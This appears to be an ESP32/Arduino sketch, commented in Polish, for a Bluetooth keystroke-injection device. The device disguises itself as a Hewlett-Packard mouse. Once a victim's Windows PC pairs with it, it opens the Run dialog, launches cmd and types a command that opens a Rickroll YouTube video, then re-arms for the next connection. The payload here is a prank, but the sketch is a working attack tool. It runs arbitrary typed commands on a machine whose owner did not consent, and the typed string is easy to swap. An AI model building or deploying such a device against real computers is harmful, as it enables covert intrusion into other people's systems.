#include <BleKeyboard.h>

BleKeyboard bleKeyboard("Myszka_Biurko_HP", "Hewlett-Packard", 100);

// Flaga blokująca ciągłe otwieranie okien
bool prankWykonany = false; 

// NOWOŚĆ: Zmienna, która sprawdza, czy jesteśmy w trakcie trwającego połączenia
bool byloPodlaczone = false; 

void setup() {
  Serial.begin(115200);
  Serial.println("Uruchamianie narzedzia BLE Ducky...");
  bleKeyboard.begin();
}

void loop() {
  // JEŚLI JESTEŚMY POŁĄCZENI Z KOMPUTEREM
  if(bleKeyboard.isConnected()) {
    
    // Sprawdzamy, czy to jest "świeże" połączenie, które nastąpiło przed sekundą
    if(!byloPodlaczone) {
      Serial.println("Wykryto cel! Odliczam 4 sekundy, by komputer nadazyl...");
      delay(4000); // Dajemy komputerowi czas na ogarnięcie, że podłączono klawiaturę
      byloPodlaczone = true;
    }

    // Jeśli mamy połączenie i prank nie był jeszcze zrobiony -> ATAK!
    if(!prankWykonany) {
      Serial.println("Wysylam Payload!");

      // KROK 1: Odpalamy okno Uruchom
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(150);
      bleKeyboard.releaseAll();
      
      // Czekamy, aż Windows otworzy fizycznie okienko w rogu ekranu
      delay(800);

      String cmd = "cmd";
      for(int i =0; i < cmd.length(); i++){
        bleKeyboard.print(cmd[i]);
        delay(50);
      }
      bleKeyboard.write(KEY_RETURN);
      bleKeyboard.releaseAll();
      delay(1500);

      //ladunek CMD
      String payload = "start https://youtu.be/dQw4w9WgXcQ";
      for(int i=0; i<payload.length(); i++){
        bleKeyboard.print(payload[i]);
        delay(50);
      }
    
      bleKeyboard.releaseAll(); 
      delay(100);
      
      // Błyskawiczny Enter zatwierdzający
      bleKeyboard.write(KEY_RETURN);
      bleKeyboard.releaseAll();

      // --- NOWY KROK: WYMUSZENIE ODTWARZANIA ---
      Serial.println("Czekam, az przegladarka zaladuje YouTube'a...");
      
      // Dajemy komputerowi aż 5 sekund (5000 ms) na pełne załadowanie strony. 
      // Jeśli komputer ofiary jest wolny, możesz to zwiększyć nawet do 7000.
      delay(5000); 

      // Wciskamy k ponownie, aby odpalić film
      bleKeyboard.press('k');
      delay(50);
      bleKeyboard.releaseAll();
      // ------------------------------------------

      Serial.println("Atak zakonczony. Przechodze w tryb uspienia.");
      
      // Blokujemy powtarzanie, żeby nie zawiesić komputera
      prankWykonany = true;
    }
    
  } 
  // JEŚLI NIE MAMY POŁĄCZENIA (np. ofiara rozłączyła BT, albo uciekliśmy z zasięgu)
  else {
    if(byloPodlaczone) {
      Serial.println("Cel zgubiony. Przeladowuje bron...");
      
      // RESETUJEMY SYSTEM! Gdy ktoś znów się połączy, kod odpali się od nowa.
      byloPodlaczone = false;
      prankWykonany = false; 
      
      delay(1000); // Żeby procesor odpoczął
    }
  }
}